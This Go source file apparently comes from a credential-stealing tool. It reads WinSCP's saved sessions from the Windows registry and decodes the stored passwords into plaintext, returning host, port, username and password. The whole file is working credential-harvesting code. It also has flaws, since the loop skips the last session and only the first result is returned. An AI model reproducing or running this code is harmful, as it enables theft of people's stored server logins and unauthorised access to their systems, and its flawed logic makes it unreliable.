package ftp

import (
	"fmt"
	"strconv"
	"strings"

	"golang.org/x/sys/windows/registry"
)

func readSubKey(registryKey string) ([]string, error) {
	var access uint32 = registry.QUERY_VALUE | registry.ENUMERATE_SUB_KEYS
	var keyNames []string
	regKey, err := registry.OpenKey(registry.CURRENT_USER, registryKey, access)
	if err != nil {
		return keyNames, err
	}
	keyNames, err = regKey.ReadSubKeyNames(0)
	if err != nil {
		// fmt.Printf("Failed to get %q keys from registry error: %v", regKey, err)
		return keyNames, err
	}
	if err := regKey.Close(); err != nil {
		// fmt.Printf("Failed to close reg key '%v' Error: %v", regKey, err)
		return keyNames, err
	}
	return keyNames, nil
}
func queryValue(regKey string, value string) (any, error) {
	k, err := registry.OpenKey(registry.CURRENT_USER, regKey, registry.QUERY_VALUE)
	if err != nil {
		return "", err
	}
	defer k.Close()

	sStr, _, errS := k.GetStringValue(value)
	if errS == registry.ErrUnexpectedType {
		sInt, _, errI := k.GetIntegerValue(value)
		if errI != nil {
			return "", errI
		}
		return sInt, nil
	}
	if errS != nil {
		return "", errS
	}
	return sStr, nil
}

func decodeNextChar(p []string) (int, error) {
	tmp0, err := strconv.Atoi(p[0])
	if err != nil {
		return -1, err
	}
	tmp1, err := strconv.Atoi(p[1])
	if err != nil {
		return -1, err
	}
	return (0xFF ^ ((((tmp0 << 4) + tmp1) ^ 0xA3) & 0xFF)), nil
}
func decryptPass(user, pass, host any) (string, error) {
	u := user.(string)
	p := pass.(string)
	h := host.(string)
	if u == "" || p == "" || h == "" {
		return p, nil
	}
	var (
		passwd      []string
		num, idx, k int
		text        string
		nErr        error
	)
	for _, char := range p {
		c := fmt.Sprintf("%c", char)
		switch c {
		case "A":
			c = "10"
		case "B":
			c = "11"
		case "C":
			c = "12"
		case "D":
			c = "13"
		case "E":
			c = "14"
		case "F":
			c = "15"
		}
		passwd = append(passwd, c)
	}
	num = 0
	tmp, err := decodeNextChar(passwd)
	if err != nil {
		return "", err
	}
	if tmp == 255 {
		num = 255
	}
	num, nErr = decodeNextChar(passwd[4:])
	if nErr != nil {
		return "", nErr
	}
	num2, err := decodeNextChar(passwd[6:])
	num2 *= 2
	if err != nil {
		return "", err
	}
	idx = num2 + 6
	for k = -1; k < num; k++ {
		tmp2, err := decodeNextChar(passwd[idx:])
		if err != nil {
			return "", err
		}
		str := fmt.Sprintf("%c", tmp2)
		idx += 2
		text += str
	}
	text = strings.ReplaceAll(text, u, "")
	text = strings.ReplaceAll(text, h, "")
	text = strings.TrimPrefix(text, "ï")
	return text, nil
}
func WinSCPCreds() (Creds, error) {
	cred := Creds{"UNKNOWN", "UNKNOWN", "UNKNOWN", 0}
	registryKey := `Software\Martin Prikryl\WinSCP 2\Sessions`
	subKeys, err := readSubKey(registryKey)
	if err != nil {
		return cred, err
	}
	var (
		i     int
		creds []Creds
	)

	for i = 0; i < len(subKeys)-1; i++ {
		session := registryKey + `\` + subKeys[i]
		// fmt.Printf("Session Name: %s\n", subKeys[i])
		user, err := queryValue(session, "UserName")
		if err != nil {
			return cred, err
		}
		port, err := queryValue(session, "PortNumber")
		if err != nil {
			return cred, err
		}
		host, err := queryValue(session, "HostName")
		if err != nil {
			return cred, err
		}
		pass, err := queryValue(session, "Password")
		if err != nil {
			return cred, err
		}
		passwd, err := decryptPass(user, pass, host)
		if err != nil {
			return cred, err
		}
		cred.Host = host.(string)
		cred.Username = user.(string)
		cred.Password = passwd
		cred.Port = int(port.(uint64))
		creds = append(creds, cred)
	}
	creds = append(creds, cred)
	// fmt.Println(creds)
	return creds[0], nil
}
